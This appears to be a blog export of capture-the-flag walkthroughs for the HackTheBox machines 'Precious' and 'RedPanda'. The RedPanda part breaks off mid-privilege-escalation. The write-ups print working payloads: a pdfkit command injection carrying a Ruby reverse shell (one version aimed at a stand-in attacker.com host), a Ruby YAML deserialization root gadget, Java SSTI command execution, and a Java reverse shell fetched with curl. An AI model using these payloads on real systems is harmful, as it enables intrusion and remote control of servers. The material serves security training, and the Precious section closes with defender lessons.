feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Precious/fuzzing/directory-htb.json WLD GET 7l 9w 145c Got 302 for http://htb/639062fb756a4c0a9ecebeb93c6bd040 (url length: 32) WLD - - - http://htb/639062fb756a4c0a9ecebeb93c6bd040 =&gt; http://precious.htb/ 302 GET 7l 9w 145c http://htb/639062fb756a4c0a9ecebeb93c6bd040~ =&gt; http://precious.htb/ WLD GET - - - Wildcard response is static; auto-filtering 145 responses; toggle this behavior by using --dont-filter [04:10:03] Discovered the following URIs - http://precious.htb/ - http://precious.htb/stylesheets/style.css - http://htb/639062fb756a4c0a9ecebeb93c6bd040 - http://htb/639062fb756a4c0a9ecebeb93c6bd040~
[04:10:03] Interesting URIs
[no result] Whatweb info:
└─$ whatweb http://$RADDR http://10.10.11.189 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.189], RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0] http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0] Having seen no obvious route forward from the port, vhost, and domain enumerations, I decided to instead take a look at the intended functionality of the website.
Exploring the Intended Functionality Note: I had already added precious.htb to my /etc/hosts file. Also, I set the target&rsquo;s IP as environment variable RADDR=10.10.11.189. My attacking box is 10.10.14.7
Taking a look at http://precious.htb immediately reveals the purpose of the website: the user provides a URL, and the server then takes a snapshot of that URL and hands you back a PDF of it. Since this is HTB, there is no great way to test this on a public website. So instead, I stood up a webserver using python:
sudo ufw allow from $RADDR to any port 8000 proto tcp python -m SimpleHTTPServer 8000 Then I pointed http://precious.htb at my SimpleHTTPServer, and got the expected result:
This got me thinking about doing some kind of script injection or maybe an XXE 🤔 So I checked the PDF&rsquo;s document properties:
File name: pveey83505cuyfqgmkcy3y04bo3isifh.pdf File size: 10.7 KB (10,931 bytes) [ ... ] Generated by pdfkit v0.8.6 PDF Producer: - PDF Version: 1.4 Page Count: 1 Page Size: 215.9 × 279.4 mm (Letter, portrait) Fast Web View: No Ok, so it was generated by pdfkit 0.8.6, that might be important later.
At this point, I did a google search for &ldquo;pdfkit exploit&rdquo;. The first result was a github repo with a big fat spoiler for this HTB box 😱 As soon as I saw the word &ldquo;Precious&rdquo; I hastily closed the tab like a kid whose parents had just walked-in on them watching explicit materials.
Since HTB is about learning, let&rsquo;s instead look at the second result from that google search (Snyk report, linked below)
FOOTHOLD Snyk Vulnerability DB has a page describing CVE-2022-25765: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795 This seems to be a likely candidate, since we already know the site is using ruby-on-rails and a vulnerable version of pdfkit.
I tried catching the POST request from precious.htb using burp:
POST / HTTP/1.1 Host: precious.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 47 Origin: http://precious.htb DNT: 1 Connection: close Referer: http://precious.htb/ Upgrade-Insecure-Requests: 1 Sec-GPC: 1 url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html Then I changed the request body to contain the PoC code from CVE-2022-25765 (I changed it to 10 seconds, because my connection is quite bad: 10s stands out a lot more than 5s).
url=http%20\`sleep 10\`%3A%2F%2F10.10.14.7%3A8000%2Findex.html Hmm. Maybe it worked? the server seemed to wait about ten seconds before replying with its &ldquo;bad URL&rdquo; message:
HTTP/1.1 200 OK [ ... ] &lt;body&gt; &lt;div class=&#34;wrapper&#34;&gt; &lt;h1 class=&#34;title&#34;&gt;Convert Web Page to PDF&lt;/h1&gt; &lt;form action=&#34;/&#34; method=&#34;post&#34;&gt; &lt;p&gt;Enter URL to fetch&lt;/p&gt;&lt;br&gt; &lt;input type=&#34;text&#34; name=&#34;url&#34; value=&#34;&#34;&gt; &lt;input type=&#34;submit&#34; value=&#34;Submit&#34;&gt; &lt;/form&gt; &lt;h2 class=&#34;msg&#34;&gt;You should provide a valid URL!&lt;/h2&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; Let&rsquo;s try it again, but instead this time using a query string in the URL (with a bogus parameter &ldquo;name&rdquo;), just like in the Snyk article I linked above.
http://10.10.14.7:8000/index.html?name=#{&#39;%20\`sleep 10\`&#39;} And this is what I saw in burp after the site performed url-encoding on it:
url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%27%2520%60sleep+10%60%27%7D Lo and behold we get a successful page load, generating the site PDF, after about ten seconds!
👏 Super! We already know the scripting language (Ruby), and it appears to be listening to arbitrary commands&hellip; so lets see if we can open up a reverse shell!
I searched GTFObins to see if there was an easy ruby reverse shell, and indeed there is:
export RHOST=attacker.com export RPORT=12345 ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(ENV[&#34;RHOST&#34;],ENV[&#34;RPORT&#34;]);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39; To prepare for the reverse shell, I added a ufw rule and set up a netcat listener:
sudo ufw allow from $RADDR to any port 4444 proto tcp nc -lvnp 4444 Then I modified the ruby reverse shell above to hardcode my IP and nc listener port:
ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;10.10.14.7&#34;,4444);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39; I replaced the sleep 10 part of the PoC request with the above reverse shell, and proxied through burp:
http://10.10.14.7:8000/index.html?name=#{\\%20\`ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(&#34;10.10.14.7&#34;,4444);while(cmd=c.gets);IO.popen(cmd,&#34;r&#34;){|io|c.print io.read}end&#39;\`} &hellip; and proxied it through burp (again, to match the url encoding scheme):
url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%2520%60ruby+-rsocket+-e+%27exit+if+fork%3Bc%3DTCPSocket.new%28%2210.10.14.7%22%2C4444%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%22r%22%29%7B%7Cio%7Cc.print+io.read%7Dend%27%60%7D 🕶️ and there&rsquo;s our reverse shell!
└─$ nc -lvnp 4444 listening on [any] 4444 ... connect to [10.10.14.7] from (UNKNOWN) [10.10.11.189] 54294 id uid=1001(ruby) gid=1001(ruby) groups=1001(ruby) USER FLAG Check /etc/passwd and see who&rsquo;s on the box:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:109::/nonexistent:/usr/sbin/nologin sshd:x:104:65534::/run/sshd:/usr/sbin/nologin henry:x:1000:1000:henry,,,:/home/henry:/bin/bash systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin ruby:x:1001:1001::/home/ruby:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false Even though the box seems to have python3, I was not able to upgrade my shell using it. No idea why. Same with perl&hellip; what the heck! And if I try even checking if socat is on the machine, my connection is terminated! What the heckin&rsquo; heck!? ☠️
I can&rsquo;t even change directories with this useless shell 😠
Oh well. Let&rsquo;s just look for the user flag and try to get past this step using the dumb shell. The flag is almost always in the foothold user&rsquo;s home directory:
ls -la /home/ruby /home/ruby: total 28 drwxr-xr-x 4 ruby ruby 4096 Feb 5 16:03 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -&gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle drwxr-xr-x 3 ruby ruby 4096 Feb 5 16:03 .cache -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile No flag&hellip; I also checked the contents of .bash_logout and .profile. Perhaps it&rsquo;s one of those directories?
ls -laR /home/ruby /home/ruby: total 28 drwxr-xr-x 4 ruby ruby 4096 Feb 5 16:03 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Oct 26 07:53 .bash_history -&gt; /dev/null -rw-r--r-- 1 ruby ruby 220 Mar 27 2022 .bash_logout -rw-r--r-- 1 ruby ruby 3526 Mar 27 2022 .bashrc dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle drwxr-xr-x 3 ruby ruby 4096 Feb 5 16:03 .cache -rw-r--r-- 1 ruby ruby 807 Mar 27 2022 .profile /home/ruby/.bundle: total 12 dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 . drwxr-xr-x 4 ruby ruby 4096 Feb 5 16:03 .. -r-xr-xr-x 1 root ruby 62 Sep 26 05:04 config /home/ruby/.cache: total 12 drwxr-xr-x 3 ruby ruby 4096 Feb 5 16:03 . drwxr-xr-x 4 ruby ruby 4096 Feb 5 16:03 .. drwxr-xr-x 2 ruby ruby 4096 Feb 5 16:03 fontconfig /home/ruby/.cache/fontconfig: total 68 drwxr-xr-x 2 ruby ruby 4096 Feb 5 16:03 . drwxr-xr-x 3 ruby ruby 4096 Feb 5 16:03 .. -rw-r--r-- 1 ruby ruby 200 Feb 5 16:03 7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7 -rw-r--r-- 1 ruby ruby 144 Feb 5 16:03 8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7 -rw-r--r-- 1 ruby ruby 200 Feb 5 16:03 CACHEDIR.TAG -rw-r--r-- 1 ruby ruby 15560 Feb 5 16:03 cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7 -rw-r--r-- 1 ruby ruby 29512 Feb 5 16:03 ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7 Ok, still no flag, but the file /home/ruby/.bundle/config intrigues me. Let&rsquo;s take a look:
Oh, nice! a credential! I wonder what it&rsquo;s for. Since we already know the box is running ssh, let&rsquo;s try that:
┌──(kali㉿kali)-[~] └─$ ssh henry@$RADDR The authenticity of host &#39;10.10.11.189 (10.10.11.189)&#39; can&#39;t be established. ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.11.189&#39; (ED25519) to the list of known hosts. henry@10.10.11.189&#39;s password: Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. henry@precious:~$ Oh thank goodness 😅 I was so sick of that ruby shell.
Since ruby didn&rsquo;t have the user flag, and there are only two users on the box with a home directory, we know henry must have the user flag. Just cat it:
henry@precious:~$ ls -la total 24 drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 . drwxr-xr-x 4 root root 4096 Oct 26 08:28 .. lrwxrwxrwx 1 root root 9 Sep 26 05:04 .bash_history -&gt; /dev/null -rw-r--r-- 1 henry henry 220 Sep 26 04:40 .bash_logout -rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc -rw-r--r-- 1 henry henry 807 Sep 26 04:40 .profile -rw-r----- 1 root henry 33 Feb 5 16:00 user.txt ROOT FLAG One of the first things I like to check for privilege escalation is PATH abuse:
henry@precious:~$ id uid=1000(henry) gid=1000(henry) groups=1000(henry) henry@precious:~$ echo $PATH /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games henry@precious:~$ find / -user henry 2&gt;/dev/null | grep -v proc /home/henry /home/henry/.profile /home/henry/.bash_logout /home/henry/.bashrc /dev/pts/0 /run/user/1000 /run/user/1000/systemd /run/user/1000/systemd/inaccessible /run/user/1000/systemd/inaccessible/chr /run/user/1000/systemd/inaccessible/sock /run/user/1000/systemd/inaccessible/fifo /run/user/1000/systemd/inaccessible/dir /run/user/1000/systemd/inaccessible/reg henry@precious:~$ find / -group henry 2&gt;/dev/null | grep -v proc [ same as -user results] Ok, no good PATH abuse opportunity.
Next I like to check the user&rsquo;s crontab:
henry@precious:~$ crontab -l no crontab for henry Alright, next up is to check for sudo privileges:
henry@precious:~$ sudo -l Matching Defaults entries for henry on precious: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User henry may run the following commands on precious: (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb Oh boy, now we&rsquo;re cooking. henry can sudo ruby /opt/update_dependencies.rb. Let&rsquo;s take a look at what that file does:
henry@precious:~$ cat /opt/update_dependencies.rb # Compare installed dependencies with those specified in &#34;dependencies.yml&#34; require &#34;yaml&#34; require &#39;rubygems&#39; # TODO: update versions automatically def update_gems() end def list_from_file YAML.load(File.read(&#34;dependencies.yml&#34;)) end def list_local_gems Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]} end gems_file = list_from_file gems_local = list_local_gems gems_file.each do |file_name, file_version| gems_local.each do |local_name, local_version| if(file_name == local_name) if(file_version != local_version) puts &#34;Installed version differs from the one specified in file: &#34; + local_name else puts &#34;Installed version is equals to the one specified in file: &#34; + local_name end end end end If I try running update_dependencies.rb, an error occurs
henry@precious:~$ sudo ruby /opt/update_dependencies.rb Traceback (most recent call last): 2: from /opt/update_dependencies.rb:17:in \`&lt;main&gt;&#39; 1: from /opt/update_dependencies.rb:10:in \`list_from_file&#39; /opt/update_dependencies.rb:10:in \`read&#39;: No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT) Apparently it can&rsquo;t find dependencies.yml 🤔 Hmm&hellip; that seems a little broken. If it&rsquo;s not adjacent to update_dependencies.rb, where is it?
henry@precious:~$ find / -name &#34;dependencies.yml&#34; 2&gt;/dev/null /opt/sample/dependencies.yml 👍 Ah, OK. Looking over update_dependencies.rb again, I see that it&rsquo;s using a relative path for loading dependencies.yml. 👎 But&hellip; I don&rsquo;t have any way of writing to the directory from which it will load dependecies.yml
I&rsquo;ll try copying the sample file into /home/henry just to see what happens
henry@precious:~$ cp /opt/sample/dependencies.yml . henry@precious:~$ sudo ruby /opt/update_dependencies.rb Installed version differs from the one specified in file: yaml Installed version is equals to the one specified in file: pdfkit 😳 Wait&hellip; WHAT?! No way. It actually ran? It didn&rsquo;t fail to find dependencies.yml??? Ruby must have some kind of environment variable that it sets when it runs, some kind of internal PATH that includes the directory where the command was invoked from. Why on earth would it do that?
Aside: How do filepaths work with ruby&rsquo;s File.read() ? Just to check if the above conclusion is true, I tried three more things:
Running /opt/update_dependenceies.rb from a directory unrelated to dependencies.yml (/tmp) Running /opt/update_dependenceies.rb from a child directory to the one containing dependencies.yml Moving dependencies.yml into that child directory then running /opt/update_dependenceies.rb from that dir&rsquo;s parent. All three failed. Thank goodness. If any of those worked, that would have been phenomenally stupid.
Back to privesc Since we don&rsquo;t even need write permissions to /opt to run /opt/update_dependenceies.rb using a custom YAML file, this is suddenly going to be much easier.
Certain that this has been done before, I googled the innocuous terms &ldquo;Ruby YAML deserialization&rdquo;. Only a few results down were several writeups with PoC code to exploit Ruby&rsquo;s unsafe handling of YAML.load(). One of the results was a page in PayloadAllTheThings.
Since the payload is dependent on ruby version, I checked the ruby version on the target machine with ruby -v: it is 2.7.4. There is a section of the PayloadAllTheThings page applicable to this version, with the following &ldquo;universal gadget&rdquo;:
--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &#34;abc&#34; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: id method_id: :resolve I then wrote the above into /home/henry/dependencies.yml and re-ran /opt/update_dependencies.rb:
Ignore the traceback: the payload id worked! Let&rsquo;s I&rsquo;ll modify this to open up a root shell instead of just running id.
So instead of running id, just run bash. Yep, it really is that simple 👍
--- - !ruby/object:Gem::Installer i: x - !ruby/object:Gem::SpecFetcher i: y - !ruby/object:Gem::Requirement requirements: !ruby/object:Gem::Package::TarReader io: &amp;1 !ruby/object:Net::BufferedIO io: &amp;1 !ruby/object:Gem::Package::TarReader::Entry read: 0 header: &#34;abc&#34; debug_output: &amp;1 !ruby/object:Net::WriteAdapter socket: &amp;1 !ruby/object:Gem::RequestSet sets: !ruby/object:Net::WriteAdapter socket: !ruby/module &#39;Kernel&#39; method_id: :system git_set: bash method_id: :resolve And there&rsquo;s the root flag! 🎉
LESSONS LEARNED Attacker Use searchsploit and a search engine often. During a penetration test, it is fair game to build on the work of others: for an HTB box, chances are low that you&rsquo;re going to blaze a new trail and write novel PoC code, so always check for CVEs! Utilize an enumeration tool like linpeas early on, once you&rsquo;ve gained a foothold. This can help you rapidly find the vulnerabilities that you&rsquo;ll need to get the flags. Keep the name of the box in mind. In this case, &ldquo;precious&rdquo; is a reference to &ldquo;ruby&rdquo;, which was a major hint for later in the box. Defender If you&rsquo;re making a web service that generates PDFs, you absolutely must: Sanitize any user input. Foothold could have been prevented by eliminating the backticks in the provided URL. Use an up-to-date version of your the PDF writer. Never leave credentials for one user inside a file owned by another user. Please just use a password manager. Ruby handles relative filepaths in a way I never would have expected. Consider using absolute filepaths instead. If you&rsquo;re using Ruby, make sure you use YAML.safe_load() instead of the unsafe (and deprecated) YAML.load(). `,url:"https://4wayhandshake.github.io/walkthrough/precious/"},"https://4wayhandshake.github.io/walkthrough/redpanda/":{title:"RedPanda",tags:["SSTI","Java","XXE","Exiftool","Scheduled Process"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Red Panda is a hilariously cute website that acts as an index for a bunch of photos of red pandas. The red panda photos each have an author marked on them.
When a user visits the site, they may use the search bar to view the photos. When they do, it increments a view counter for that photo. Part of the site describes that the author who contributed the photo is then credited on a per-view basis. So not only does the site serve photos, it is also logging and processing the count of views for each photo.
Please forgive the format. I wrote this before I had nailed-down a good way to take notes for walkthroughs. In fact, this was the first walkthrough I ever posted.
RECON I begin by setting $RADDR to my target machine&rsquo;s IP, then scanned with typical nmap &ldquo;init&rdquo; scan:
nmap -sV -sC -O -n -Pn -oA nmap/init-scan $RADDR discovered webserver on 8080, ssh on 22.
Used ffuf for subdomain enumeration. Didn&rsquo;t find anything. Then to make things easier, I added redpanda.htb to my /etc/hosts.
Used feroxbuster directory enumeration &ndash;&gt; found the /stats page. /stats reveals the path of some images. It also suggests that something is counting the number of times pages have loaded.
Examination of the html shows a comment linking to a codepen: https://codepen.io/khr2003/pen/BGZdXw. Sadly, the CodePen only reveals how the main page&rsquo;s animation was created.
Initial checks for template injection on the search field show $ is a banned character. So is %
Checking the /stats?author=&hellip; uri for template injection &ndash;&gt; http://redpanda.htb:8080/stats?author=\${7*7} gave a funny 400-BadRequest page. Went back to check more SSTI against the search field. Found that it would evaluate basic math without any escaping.
🎉 Found it! *{ } works as one would expect \${} to work. We can put the payload within those characters to execute code and return the output to the search page.
FOOTHOLD This worked (modified from PayloadAllTheThings SSTI section.)
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())} If you follow the ascii table, that says &ldquo;cat /etc/passwd&rdquo;
This revealed the contents. It looks like we might be finding a way into the woodenk user, but that&rsquo;s just a guess:
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin woodenk:x:1000:1000:,,,:/home/woodenk:/bin/bash mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false I figured I could write a script to assemble this insane concatenation of characters&hellip; however, it&rsquo;s likely someone else has already written such a script!
A quick google search revealed: https://github.com/VikasVarshney/ssti-payload
I used the above tool to generate a payload to check &lsquo;id&rsquo;:
*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())} This revealed we are running as user woodenk. Thank goodness, we already know they have terminal access and mysql. They are also a member of the logs group.
uid=1000(woodenk) gid=1001(logs) groups=1001(logs),1000(woodenk) I wanted to see if we could nab their ssh key, but instead discovered the user flag. Here is the result of ls -a /home/woodenk :
. .. .bash_history .bash_logout .bashrc .cache .local .m2 .profile user.txt Maybe I can put an extra file with a reverse shell somewhere in the server..?
Put a pin in that. For now, checking what logs are available:
apt auth.log auth.log.1 auth.log.2.gz btmp btmp.1 dist-upgrade dmesg dmesg.0 dmesg.1.gz dpkg.log dpkg.log.1 installer journal kern.log kern.log.1 kern.log.2.gz landscape lastlog mysql private syslog syslog.1 syslog.2.gz syslog.3.gz ubuntu-advantage.log ubuntu-advantage-timer.log vmware-network.1.log vmware-network.2.log vmware-network.log vmware-vmsvc-root.1.log vmware-vmsvc-root.2.log vmware-vmsvc-root.log vmware-vmtoolsd-root.log wtmp Checking the running processes with ps -e, nothing of note really.
Is netcat present?
Yes! it is present! it&rsquo;s at /usr/bin/nc
I can connect using nc to my attacker box, but can&rsquo;t seem to get a shell&hellip; what the heck! Maybe I need to b64 encode it?
Curl is present, and obviously the target machine can reach out over port 8080 (that the webserver is proxied through), so I can transfer files using curl from my attacker machine to the target machine. And I&rsquo;ve verified javac is present on the target machine. How about setting up a java reverse shell instead?
I would prefer python, perl, sh, or really anything else. But it looks like only java is present on this machine. 😞
And&hellip; It worked! :happy:
I did the following to establish the java reverse shell:
Create the file C.java (modified from here):
import java.io.IOException; import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class C { public static void main(String[] args) throws Exception { String host=&#34;10.10.14.4&#34;; int port=4444; String cmd=&#34;/bin/sh&#34;; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start(); Socket s=new Socket(host,port); InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream(); OutputStream po=p.getOutputStream(),so=s.getOutputStream(); while(!s.isClosed()) { while(pi.available()&gt;0) so.write(pi.read()); while(pe.available()&gt;0) so.write(pe.read()); while(si.available()&gt;0) po.write(si.read()); so.flush(); po.flush(); Thread.sleep(50); try { p.exitValue(); break; } catch (Exception e){ } }; p.destroy(); s.close(); } } (Of course, I tested this using a local connection, specifying 127.0.0.1 port 4444 initially)
I put this into a folder hosted using python&rsquo;s http.server on port 8080 then set up my netcat listener:
nc -lvnp 4444 Then I utilized the template injection vulnerability to issue the following commands to the target machine, in the form of payloads created by ssti-payload.
issue command to ssti-payload, then strip off the leading &ldquo;\${&rdquo; and trailing &ldquo;}&rdquo;, then use the template injection vuln by searching commands of the form &ldquo;*{[PAYLOAD]}&rdquo;, where [PAYLOAD] is the stripped output of ssti-payload as described above
curl 10.10.14.4:8080/C.java -o /home/woodenk/C.java javac /home/woodenk/C.java java -cp /home/woodenk C And there&rsquo;s the shell!
USER FLAG Finding Python Immediately after getting the shell, I realized I had mistakenly discounted python&hellip; python3 is definitely present (yikes I needed this practice 😓) and I could have used my favoured python3 shell anyway.
All good though, at least I can upgrade from a dumb shell using the typical python trick:
python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Although I already grabbed the flag, it&rsquo;s easy to go get it now. It&rsquo;s in /home/woodenk
Aside: Fixing my Shell Hold up, there&rsquo;s still something wrong with my shell though. I did the following to upgrade my shell to fully-colored bash:
Enabled raw mode (so fancy things like tab completion and ctrl+c work): &gt;&gt; CTRL + z &gt;&gt; stty raw -echo &gt;&gt; FG [Enter] [Enter] Then gave it colors: &gt;&gt; export TERM=xterm256-color &gt;&gt; stty rows 48 columns 197 But now my backspace isn&rsquo;t working! I did the following to fix it:
stty -a &lt;------ Looks normal. Maybe a character spacing issue? stty sane export TERM=linux stty -a &lt;------ noted that Erase was incorrect stty erase ^H &lt;------ That&#39;s &#39;stty erase &#39; [ctrl+v] [backspace] [enter] And now I have a fully-functional bash shell with colored terminal.
Privilege Escalation Linpeas showed the following lines of note:
# 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ This is a frequent backup. Perhaps I can check woodenk&rsquo;s .bash_history to get a credential.
Nope, bash_history is empty. I&rsquo;ll check for running services:
netstat -tulpn | grep LISTEN MySQL is on port 3306 and 33060. No surprises there.
At this point, I used my python http.server to transfer my usual toolkit, including:
LinEnum linpeas pspy I ran pspy for a bit and noticed the chron job happening
This must be what tallies the view count of the red panda images and &ldquo;pays&rdquo; the contributors. This funcitonality is mentioned on the website at http://redpanda.htb/stats. When I investigated what was happening with LogParser. I found the source code at this location:
woodenk@redpanda:/opt/credit-score/LogParser/final/src/main/java/com/logparser$ less App.java The gist of it is that logparser is opening up /opt/panda_search/redpanda.log, reading each line. It splits the line according to its columns and checks if that line is an image, then it increments the tallies for how many times each image is accessed.
The contents of /opt/panda_search are somewhat interesting. When I initially arrived at it, the log was empty. However, as suspected, it had entries populated into it when I navigated around the website in my browser. So far, what I&rsquo;ve seen is a pretty typical webserver log:
Ok neat. But how does it know which author to credit for each image? The answer is within the getArtist function of App.java. It appears to read the image metadata. The getArtist() function is shown below:
